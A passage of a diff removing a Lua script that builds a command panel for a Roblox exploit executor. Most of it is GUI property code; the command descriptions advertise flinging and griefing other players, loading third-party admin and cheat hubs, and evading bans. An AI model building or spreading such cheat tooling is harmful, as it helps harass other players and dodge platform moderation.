@@ -1,1075 +1,1442 @@
--- Generated using RoadToGlory's Converter v1.1 (RoadToGlory#9879)
--- this is old as hell i just randomly decided to update it to fix a few things and make loader work
-
--- Instances:
-
-local Converted = {
-	["_GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh"] = Instance.new("ScreenGui");
-	["_MainFrame"] = Instance.new("Frame");
-	["_Input"] = Instance.new("TextBox");
-	["_UICorner"] = Instance.new("UICorner");
-	["_UIStroke"] = Instance.new("UIStroke");
-	["_UICorner1"] = Instance.new("UICorner");
-	["_Line"] = Instance.new("Frame");
-	["_Output"] = Instance.new("TextLabel");
-	["_UIStroke1"] = Instance.new("UIStroke");
-	["_UICorner2"] = Instance.new("UICorner");
-	["_Dragify"] = Instance.new("LocalScript");
-	["_Main"] = Instance.new("LocalScript");
-	["_CmdFrame"] = Instance.new("Frame");
-	["_UICorner3"] = Instance.new("UICorner");
-	["_Title"] = Instance.new("TextLabel");
-	["_Frame"] = Instance.new("Frame");
-	["_CmdScroll"] = Instance.new("ScrollingFrame");
-	["_SmoothScroll"] = Instance.new("LocalScript");
-	["_InputFrame"] = Instance.new("ObjectValue");
-	["_SmoothingEnabled"] = Instance.new("BoolValue");
-	["_SmoothingFactor"] = Instance.new("NumberValue");
-	["_UIListLayout"] = Instance.new("UIListLayout");
-	["_cmd"] = Instance.new("TextButton");
-	["_InfoScript"] = Instance.new("LocalScript");
-	["_Info"] = Instance.new("StringValue");
-	["_cmd1"] = Instance.new("TextButton");
-	["_InfoScript1"] = Instance.new("LocalScript");
-	["_Info1"] = Instance.new("StringValue");
-	["_cmd2"] = Instance.new("TextButton");
-	["_InfoScript2"] = Instance.new("LocalScript");
-	["_Info2"] = Instance.new("StringValue");
-	["_cmd3"] = Instance.new("TextButton");
-	["_InfoScript3"] = Instance.new("LocalScript");
-	["_Info3"] = Instance.new("StringValue");
-	["_cmd4"] = Instance.new("TextButton");
-	["_InfoScript4"] = Instance.new("LocalScript");
-	["_Info4"] = Instance.new("StringValue");
-	["_cmd5"] = Instance.new("TextButton");
-	["_InfoScript5"] = Instance.new("LocalScript");
-	["_Info5"] = Instance.new("StringValue");
-	["_cmd6"] = Instance.new("TextButton");
-	["_InfoScript6"] = Instance.new("LocalScript");
-	["_Info6"] = Instance.new("StringValue");
-	["_cmd7"] = Instance.new("TextButton");
-	["_InfoScript7"] = Instance.new("LocalScript");
-	["_Info7"] = Instance.new("StringValue");
-	["_cmd8"] = Instance.new("TextButton");
-	["_InfoScript8"] = Instance.new("LocalScript");
-	["_Info8"] = Instance.new("StringValue");
-	["_cmd9"] = Instance.new("TextButton");
-	["_InfoScript9"] = Instance.new("LocalScript");
-	["_Info9"] = Instance.new("StringValue");
-	["_cmd10"] = Instance.new("TextButton");
-	["_InfoScript10"] = Instance.new("LocalScript");
-	["_Info10"] = Instance.new("StringValue");
-	["_cmd11"] = Instance.new("TextButton");
-	["_InfoScript11"] = Instance.new("LocalScript");
-	["_Info11"] = Instance.new("StringValue");
-	["_cmd12"] = Instance.new("TextButton");
-	["_InfoScript12"] = Instance.new("LocalScript");
-	["_Info12"] = Instance.new("StringValue");
-	["_cmd13"] = Instance.new("TextButton");
-	["_InfoScript13"] = Instance.new("LocalScript");
-	["_Info13"] = Instance.new("StringValue");
-	["_cmd14"] = Instance.new("TextButton");
-	["_InfoScript14"] = Instance.new("LocalScript");
-	["_Info14"] = Instance.new("StringValue");
-	["_cmd15"] = Instance.new("TextButton");
-	["_InfoScript15"] = Instance.new("LocalScript");
-	["_Info15"] = Instance.new("StringValue");
-	["_cmd16"] = Instance.new("TextButton");
-	["_InfoScript16"] = Instance.new("LocalScript");
-	["_Info16"] = Instance.new("StringValue");
-	["_cmd17"] = Instance.new("TextButton");
-	["_InfoScript17"] = Instance.new("LocalScript");
-	["_Info17"] = Instance.new("StringValue");
-	["_cmd18"] = Instance.new("TextButton");
-	["_InfoScript18"] = Instance.new("LocalScript");
-	["_Info18"] = Instance.new("StringValue");
-	["_cmd19"] = Instance.new("TextButton");
-	["_InfoScript19"] = Instance.new("LocalScript");
-	["_Info19"] = Instance.new("StringValue");
-	["_cmd20"] = Instance.new("TextButton");
-	["_InfoScript20"] = Instance.new("LocalScript");
-	["_Info20"] = Instance.new("StringValue");
-	["_cmd21"] = Instance.new("TextButton");
-	["_InfoScript21"] = Instance.new("LocalScript");
-	["_Info21"] = Instance.new("StringValue");
-	["_cmd22"] = Instance.new("TextButton");
-	["_InfoScript22"] = Instance.new("LocalScript");
-	["_Info22"] = Instance.new("StringValue");
-	["_cmd23"] = Instance.new("TextButton");
-	["_InfoScript23"] = Instance.new("LocalScript");
-	["_Info23"] = Instance.new("StringValue");
-	["_cmd24"] = Instance.new("TextButton");
-	["_InfoScript24"] = Instance.new("LocalScript");
-	["_Info24"] = Instance.new("StringValue");
-	["_cmd25"] = Instance.new("TextButton");
-	["_InfoScript25"] = Instance.new("LocalScript");
-	["_Info25"] = Instance.new("StringValue");
-	["_cmd26"] = Instance.new("TextButton");
-	["_InfoScript26"] = Instance.new("LocalScript");
-	["_Info26"] = Instance.new("StringValue");
-	["_cmd27"] = Instance.new("TextButton");
-	["_InfoScript27"] = Instance.new("LocalScript");
-	["_Info27"] = Instance.new("StringValue");
-	["_cmd28"] = Instance.new("TextButton");
-	["_InfoScript28"] = Instance.new("LocalScript");
-	["_Info28"] = Instance.new("StringValue");
-	["_cmd29"] = Instance.new("TextButton");
-	["_InfoScript29"] = Instance.new("LocalScript");
-	["_Info29"] = Instance.new("StringValue");
-	["_cmd30"] = Instance.new("TextButton");
-	["_InfoScript30"] = Instance.new("LocalScript");
-	["_Info30"] = Instance.new("StringValue");
-	["_cmd31"] = Instance.new("TextButton");
-	["_InfoScript31"] = Instance.new("LocalScript");
-	["_Info31"] = Instance.new("StringValue");
-	["_cmd32"] = Instance.new("TextButton");
-	["_InfoScript32"] = Instance.new("LocalScript");
-	["_Info32"] = Instance.new("StringValue");
-	["_cmd33"] = Instance.new("TextButton");
-	["_InfoScript33"] = Instance.new("LocalScript");
-	["_Info33"] = Instance.new("StringValue");
-	["_cmd34"] = Instance.new("TextButton");
-	["_InfoScript34"] = Instance.new("LocalScript");
-	["_Info34"] = Instance.new("StringValue");
-	["_cmd35"] = Instance.new("TextButton");
-	["_InfoScript35"] = Instance.new("LocalScript");
-	["_Info35"] = Instance.new("StringValue");
-	["_cmd36"] = Instance.new("TextButton");
-	["_InfoScript36"] = Instance.new("LocalScript");
-	["_Info36"] = Instance.new("StringValue");
-	["_cmd37"] = Instance.new("TextButton");
-	["_InfoScript37"] = Instance.new("LocalScript");
-	["_Info37"] = Instance.new("StringValue");
-	["_cmd38"] = Instance.new("TextButton");
-	["_InfoScript38"] = Instance.new("LocalScript");
-	["_Info38"] = Instance.new("StringValue");
-	["_cmd39"] = Instance.new("TextButton");
-	["_InfoScript39"] = Instance.new("LocalScript");
-	["_Info39"] = Instance.new("StringValue");
-	["_cmd40"] = Instance.new("TextButton");
-	["_InfoScript40"] = Instance.new("LocalScript");
-	["_Info40"] = Instance.new("StringValue");
-	["_cmd41"] = Instance.new("TextButton");
-	["_InfoScript41"] = Instance.new("LocalScript");
-	["_Info41"] = Instance.new("StringValue");
-	["_UICorner4"] = Instance.new("UICorner");
-	["_UIStroke2"] = Instance.new("UIStroke");
-	["_Dragify1"] = Instance.new("LocalScript");
-}
-
--- Properties:
-
-Converted["_GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh"].DisplayOrder = 999999999
-Converted["_GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh"].ResetOnSpawn = false
-Converted["_GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh"].Name = "GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh"
-Converted["_GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh"].Parent = gethui() or game:GetService("CoreGui") -- for non gethui support executors - e god
-
-Converted["_MainFrame"].BackgroundColor3 = Color3.fromRGB(25.000000409781933, 25.000000409781933, 25.000000409781933)
-Converted["_MainFrame"].BorderSizePixel = 0
-Converted["_MainFrame"].Position = UDim2.new(0.747767806, 0, 0.5333222555, 0)
-Converted["_MainFrame"].Size = UDim2.new(0.251993626, 0, 0.187697157, 0)
-Converted["_MainFrame"].ZIndex = 999999999
-Converted["_MainFrame"].Name = "MainFrame"
-Converted["_MainFrame"].Parent = Converted["_GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh"]
-
-Converted["_Input"].ClearTextOnFocus = false
-Converted["_Input"].Font = Enum.Font.Code
-Converted["_Input"].PlaceholderColor3 = Color3.fromRGB(0, 113.00000846385956, 166.00000530481339)
-Converted["_Input"].PlaceholderText = "E Commands - Put Command Here And Press Enter"
-Converted["_Input"].Text = ""
-Converted["_Input"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_Input"].TextScaled = true
-Converted["_Input"].TextSize = 14
-Converted["_Input"].TextWrapped = true
-Converted["_Input"].BackgroundColor3 = Color3.fromRGB(80.00000283122063, 80.00000283122063, 80.00000283122063)
-Converted["_Input"].BackgroundTransparency = 0.5
-Converted["_Input"].BorderSizePixel = 0
-Converted["_Input"].Position = UDim2.new(0.0221518986, 0, 0.0588235296, 0)
-Converted["_Input"].Size = UDim2.new(0.952531636, 0, 0.30252102, 0)
-Converted["_Input"].ZIndex = 999999999
-Converted["_Input"].Name = "Input"
-Converted["_Input"].Parent = Converted["_MainFrame"]
-
-Converted["_UICorner"].Parent = Converted["_Input"]
-
-Converted["_UIStroke"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-Converted["_UIStroke"].Color = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_UIStroke"].Parent = Converted["_Input"]
-
-Converted["_UICorner1"].Parent = Converted["_MainFrame"]
-
-Converted["_Line"].BackgroundColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_Line"].Position = UDim2.new(0.0221518986, 0, 0.436974794, 0)
-Converted["_Line"].Size = UDim2.new(0.952531636, 0, 0.0168067235, 0)
-Converted["_Line"].ZIndex = 999999999
-Converted["_Line"].Name = "Line"
-Converted["_Line"].Parent = Converted["_MainFrame"]
-
-Converted["_Output"].Font = Enum.Font.Code
-Converted["_Output"].Text = ""
-Converted["_Output"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_Output"].TextScaled = true
-Converted["_Output"].TextSize = 14
-Converted["_Output"].TextWrapped = true
-Converted["_Output"].BackgroundColor3 = Color3.fromRGB(80.00000283122063, 80.00000283122063, 80.00000283122063)
-Converted["_Output"].BackgroundTransparency = 0.5
-Converted["_Output"].BorderSizePixel = 0
-Converted["_Output"].Position = UDim2.new(0.0221518986, 0, 0.512605071, 0)
-Converted["_Output"].Size = UDim2.new(0.952531636, 0, 0.420168072, 0)
-Converted["_Output"].ZIndex = 999999999
-Converted["_Output"].Name = "Output"
-Converted["_Output"].Parent = Converted["_MainFrame"]
-
-Converted["_UIStroke1"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-Converted["_UIStroke1"].Color = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_UIStroke1"].Parent = Converted["_Output"]
-
-Converted["_UICorner2"].Parent = Converted["_Output"]
-
-Converted["_CmdFrame"].BackgroundColor3 = Color3.fromRGB(47.0000009983778, 47.0000009983778, 47.0000009983778)
-Converted["_CmdFrame"].Position = UDim2.new(0.0911790431, 0, 0.331386805, 0)
-Converted["_CmdFrame"].Size = UDim2.new(0.196495235, 0, 0.417981058, 0)
-Converted["_CmdFrame"].Visible = false
-Converted["_CmdFrame"].ZIndex = 999999999
-Converted["_CmdFrame"].Name = "CmdFrame"
-Converted["_CmdFrame"].Parent = Converted["_GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh"]
-
-Converted["_UICorner3"].Parent = Converted["_CmdFrame"]
-
-Converted["_Title"].Font = Enum.Font.FredokaOne
-Converted["_Title"].Text = "E Commands List"
-Converted["_Title"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_Title"].TextScaled = true
-Converted["_Title"].TextSize = 14
-Converted["_Title"].TextWrapped = true
-Converted["_Title"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_Title"].BackgroundTransparency = 1
-Converted["_Title"].Position = UDim2.new(0.042857144, 0, 0, 0)
-Converted["_Title"].Size = UDim2.new(0.919047594, 0, 0.128301889, 0)
-Converted["_Title"].ZIndex = 999999999
-Converted["_Title"].Name = "Title"
-Converted["_Title"].Parent = Converted["_CmdFrame"]
-
-Converted["_Frame"].BackgroundColor3 = Color3.fromRGB(38.0000015348196, 38.0000015348196, 38.0000015348196)
-Converted["_Frame"].BorderSizePixel = 0
-Converted["_Frame"].Position = UDim2.new(0.0316538028, 0, 0.169117838, 0)
-Converted["_Frame"].Size = UDim2.new(0.940561295, 0, 0.796226442, 0)
-Converted["_Frame"].ZIndex = 999999999
-Converted["_Frame"].Parent = Converted["_CmdFrame"]
-
-Converted["_CmdScroll"].CanvasSize = UDim2.new(0, 0, 30, 0)
-Converted["_CmdScroll"].ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
-Converted["_CmdScroll"].Active = true
-Converted["_CmdScroll"].BackgroundColor3 = Color3.fromRGB(38.0000015348196, 38.0000015348196, 38.0000015348196)
-Converted["_CmdScroll"].BackgroundTransparency = 1
-Converted["_CmdScroll"].BorderSizePixel = 0
-Converted["_CmdScroll"].Position = UDim2.new(1.79515169e-07, 0, 0.00313078682, 0)
-Converted["_CmdScroll"].Size = UDim2.new(0.999999702, 0, 0.996869266, 0)
-Converted["_CmdScroll"].ZIndex = 999999999
-Converted["_CmdScroll"].Name = "CmdScroll"
-Converted["_CmdScroll"].Parent = Converted["_Frame"]
-
-Converted["_UIListLayout"].SortOrder = Enum.SortOrder.LayoutOrder
-Converted["_UIListLayout"].Parent = Converted["_CmdScroll"]
-
-Converted["_cmd"].Font = Enum.Font.FredokaOne
-Converted["_cmd"].Text = " >dex"
-Converted["_cmd"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd"].TextScaled = true
-Converted["_cmd"].TextSize = 14
-Converted["_cmd"].TextWrapped = true
-Converted["_cmd"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd"].BackgroundTransparency = 1
-Converted["_cmd"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd"].ZIndex = 999999999
-Converted["_cmd"].Name = "cmd"
-Converted["_cmd"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info"].Value = "Command Info: Dex let's you see every instance in the game. (well not every idk why I said every) (some executors may crash when loading this idk for sure though since this is the bypassed version which uses a ton of methods)"
-Converted["_Info"].Name = "Info"
-Converted["_Info"].Parent = Converted["_cmd"]
-
-Converted["_cmd1"].Font = Enum.Font.FredokaOne
-Converted["_cmd1"].Text = " >punch"
-Converted["_cmd1"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd1"].TextScaled = true
-Converted["_cmd1"].TextSize = 14
-Converted["_cmd1"].TextWrapped = true
-Converted["_cmd1"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd1"].BackgroundTransparency = 1
-Converted["_cmd1"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd1"].ZIndex = 999999999
-Converted["_cmd1"].Name = "cmd"
-Converted["_cmd1"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info1"].Value = "Command Info: Press K to punch. (It flings people + no cooldown) (Mobile users should use a mobile keyboard script)"
-Converted["_Info1"].Name = "Info"
-Converted["_Info1"].Parent = Converted["_cmd1"]
-
-Converted["_cmd2"].Font = Enum.Font.FredokaOne
-Converted["_cmd2"].Text = " >iy"
-Converted["_cmd2"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd2"].TextScaled = true
-Converted["_cmd2"].TextSize = 14
-Converted["_cmd2"].TextWrapped = true
-Converted["_cmd2"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd2"].BackgroundTransparency = 1
-Converted["_cmd2"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd2"].ZIndex = 999999999
-Converted["_cmd2"].Name = "cmd"
-Converted["_cmd2"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info2"].Value = "Command Info: Executes the popular admin script, Infinite Yield."
-Converted["_Info2"].Name = "Info"
-Converted["_Info2"].Parent = Converted["_cmd2"]
-
-Converted["_cmd3"].Font = Enum.Font.FredokaOne
-Converted["_cmd3"].Text = " >cmdx"
-Converted["_cmd3"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd3"].TextScaled = true
-Converted["_cmd3"].TextSize = 14
-Converted["_cmd3"].TextWrapped = true
-Converted["_cmd3"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd3"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd3"].BackgroundTransparency = 1
-Converted["_cmd3"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd3"].ZIndex = 999999999
-Converted["_cmd3"].Name = "cmd"
-Converted["_cmd3"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info3"].Value = "Command Info: Another popular admin script called CMD X."
-Converted["_Info3"].Name = "Info"
-Converted["_Info3"].Parent = Converted["_cmd3"]
-
-Converted["_cmd4"].Font = Enum.Font.FredokaOne
-Converted["_cmd4"].Text = " >cmds"
-Converted["_cmd4"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd4"].TextScaled = true
-Converted["_cmd4"].TextSize = 14
-Converted["_cmd4"].TextWrapped = true
-Converted["_cmd4"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd4"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd4"].BackgroundTransparency = 1
-Converted["_cmd4"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd4"].ZIndex = 999999999
-Converted["_cmd4"].Name = "cmd"
-Converted["_cmd4"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info4"].Value = "Command Info: Opens the Commands List"
-Converted["_Info4"].Name = "Info"
-Converted["_Info4"].Parent = Converted["_cmd4"]
-
-Converted["_cmd5"].Font = Enum.Font.FredokaOne
-Converted["_cmd5"].Text = " >uncmds"
-Converted["_cmd5"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd5"].TextScaled = true
-Converted["_cmd5"].TextSize = 14
-Converted["_cmd5"].TextWrapped = true
-Converted["_cmd5"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd5"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd5"].BackgroundTransparency = 1
-Converted["_cmd5"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd5"].ZIndex = 999999999
-Converted["_cmd5"].Name = "cmd"
-Converted["_cmd5"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info5"].Value = "Command Info: Closes the Command List"
-Converted["_Info5"].Name = "Info"
-Converted["_Info5"].Parent = Converted["_cmd5"]
-
-Converted["_cmd6"].Font = Enum.Font.FredokaOne
-Converted["_cmd6"].Text = " >spinfling"
-Converted["_cmd6"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd6"].TextScaled = true
-Converted["_cmd6"].TextSize = 14
-Converted["_cmd6"].TextWrapped = true
-Converted["_cmd6"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd6"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd6"].BackgroundTransparency = 1
-Converted["_cmd6"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd6"].ZIndex = 999999999
-Converted["_cmd6"].Name = "cmd"
-Converted["_cmd6"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info6"].Value = "Command Info: Spins you very fast with velocity that you fling people."
-Converted["_Info6"].Name = "Info"
-Converted["_Info6"].Parent = Converted["_cmd6"]
-
-Converted["_cmd7"].Font = Enum.Font.FredokaOne
-Converted["_cmd7"].Text = " >unspinfling"
-Converted["_cmd7"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd7"].TextScaled = true
-Converted["_cmd7"].TextSize = 14
-Converted["_cmd7"].TextWrapped = true
-Converted["_cmd7"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd7"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd7"].BackgroundTransparency = 1
-Converted["_cmd7"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd7"].ZIndex = 999999999
-Converted["_cmd7"].Name = "cmd"
-Converted["_cmd7"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info7"].Value = "Command Info: This turns off Spin Fling"
-Converted["_Info7"].Name = "Info"
-Converted["_Info7"].Parent = Converted["_cmd7"]
-
-Converted["_cmd8"].Font = Enum.Font.FredokaOne
-Converted["_cmd8"].Text = " >fling/<player name>"
-Converted["_cmd8"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd8"].TextScaled = true
-Converted["_cmd8"].TextSize = 14
-Converted["_cmd8"].TextWrapped = true
-Converted["_cmd8"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd8"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd8"].BackgroundTransparency = 1
-Converted["_cmd8"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd8"].ZIndex = 999999999
-Converted["_cmd8"].Name = "cmd"
-Converted["_cmd8"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info8"].Value = "Command Info: Does not require a tool unlike others."
-Converted["_Info8"].Name = "Info"
-Converted["_Info8"].Parent = Converted["_cmd8"]
-
-Converted["_cmd9"].Font = Enum.Font.FredokaOne
-Converted["_cmd9"].Text = " >noclipfling/<player name>"
-Converted["_cmd9"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd9"].TextScaled = true
-Converted["_cmd9"].TextSize = 14
-Converted["_cmd9"].TextWrapped = true
-Converted["_cmd9"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd9"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd9"].BackgroundTransparency = 1
-Converted["_cmd9"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd9"].ZIndex = 999999999
-Converted["_cmd9"].Name = "cmd"
-Converted["_cmd9"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info9"].Value = "Command Info: Flings people who have noclip on. (not anti fling)"
-Converted["_Info9"].Name = "Info"
-Converted["_Info9"].Parent = Converted["_cmd9"]
-
-Converted["_cmd10"].Font = Enum.Font.FredokaOne
-Converted["_cmd10"].Text = " >expandchat"
-Converted["_cmd10"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd10"].TextScaled = true
-Converted["_cmd10"].TextSize = 14
-Converted["_cmd10"].TextWrapped = true
-Converted["_cmd10"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd10"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd10"].BackgroundTransparency = 1
-Converted["_cmd10"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd10"].ZIndex = 999999999
-Converted["_cmd10"].Name = "cmd"
-Converted["_cmd10"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info10"].Value = "Command Info: Let's you be able to resize the chat + drag it. (only for legacy chat and i think only works on mobile most of the time)"
-Converted["_Info10"].Name = "Info"
-Converted["_Info10"].Parent = Converted["_cmd10"]
-
-Converted["_cmd11"].Font = Enum.Font.FredokaOne
-Converted["_cmd11"].Text = " >antichatlog"
-Converted["_cmd11"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd11"].TextScaled = true
-Converted["_cmd11"].TextSize = 14
-Converted["_cmd11"].TextWrapped = true
-Converted["_cmd11"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd11"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd11"].BackgroundTransparency = 1
-Converted["_cmd11"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd11"].ZIndex = 999999999
-Converted["_cmd11"].Name = "cmd"
-Converted["_cmd11"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info11"].Value = "Command Info: Makes you unable to get banned by Roblox. (this is broken and stuff but im too lazy to remove this)"
-Converted["_Info11"].Name = "Info"
-Converted["_Info11"].Parent = Converted["_cmd11"]
-
-Converted["_cmd12"].Font = Enum.Font.FredokaOne
-Converted["_cmd12"].Text = " >eclipsehub/<Premium key or 'nil'>"
-Converted["_cmd12"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd12"].TextScaled = true
-Converted["_cmd12"].TextSize = 14
-Converted["_cmd12"].TextWrapped = true
-Converted["_cmd12"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd12"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd12"].BackgroundTransparency = 1
-Converted["_cmd12"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd12"].ZIndex = 999999999
-Converted["_cmd12"].Name = "cmd"
-Converted["_cmd12"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info12"].Value = "Command Info: Eclipse Hub has a lot for Murder Mystery 2 which is what I mostly use it for. (optional premium key argument BUT you have to put 'nil' if you don't have one)"
-Converted["_Info12"].Name = "Info"
-Converted["_Info12"].Parent = Converted["_cmd12"]
-
-Converted["_cmd13"].Font = Enum.Font.FredokaOne
-Converted["_cmd13"].Text = " >muteradio/<player name>"
-Converted["_cmd13"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd13"].TextScaled = true
-Converted["_cmd13"].TextSize = 14
-Converted["_cmd13"].TextWrapped = true
-Converted["_cmd13"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd13"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd13"].BackgroundTransparency = 1
-Converted["_cmd13"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd13"].ZIndex = 999999999
-Converted["_cmd13"].Name = "cmd"
-Converted["_cmd13"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info13"].Value = "Command Info: Mutes someone boombox temporarily. (More info once command is used in output box)"
-Converted["_Info13"].Name = "Info"
-Converted["_Info13"].Parent = Converted["_cmd13"]
-
-Converted["_cmd14"].Font = Enum.Font.FredokaOne
-Converted["_cmd14"].Text = " >loopmuteradio/<player name>"
-Converted["_cmd14"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd14"].TextScaled = true
-Converted["_cmd14"].TextSize = 14
-Converted["_cmd14"].TextWrapped = true
-Converted["_cmd14"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd14"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd14"].BackgroundTransparency = 1
-Converted["_cmd14"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd14"].ZIndex = 999999999
-Converted["_cmd14"].Name = "cmd"
-Converted["_cmd14"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info14"].Value = "Command Info: Loop mutes someones boombox. (extra info once executed from output box)"
-Converted["_Info14"].Name = "Info"
-Converted["_Info14"].Parent = Converted["_cmd14"]
-
-Converted["_cmd15"].Font = Enum.Font.FredokaOne
-Converted["_cmd15"].Text = " >unloopmuteradio"
-Converted["_cmd15"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd15"].TextScaled = true
-Converted["_cmd15"].TextSize = 14
-Converted["_cmd15"].TextWrapped = true
-Converted["_cmd15"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd15"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd15"].BackgroundTransparency = 1
-Converted["_cmd15"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd15"].ZIndex = 999999999
-Converted["_cmd15"].Name = "cmd"
-Converted["_cmd15"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info15"].Value = "Command Info: Turns off Loop Mute for all the people who were affected."
-Converted["_Info15"].Name = "Info"
-Converted["_Info15"].Parent = Converted["_cmd15"]
-
-Converted["_cmd16"].Font = Enum.Font.FredokaOne
-Converted["_cmd16"].Text = " >glitchradio/<player name>"
-Converted["_cmd16"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd16"].TextScaled = true
-Converted["_cmd16"].TextSize = 14
